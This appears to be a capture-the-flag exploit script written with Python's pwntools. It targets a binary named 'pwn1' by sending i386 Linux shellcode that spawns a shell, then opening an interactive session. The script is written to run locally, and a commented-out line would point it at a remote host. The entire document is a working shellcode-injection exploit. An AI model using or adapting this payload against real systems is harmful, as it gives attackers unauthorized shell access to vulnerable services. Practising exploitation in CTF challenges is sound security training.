from pwn import *
context(arch = 'i386',log_level = 'debug', os = 'linux')
io = process('./pwn1')
#io = remote("ip", port)
shellcode = asm(shellcraft.sh())
io.sendline(shellcode) 
#io.recv() 
io.interactive()  

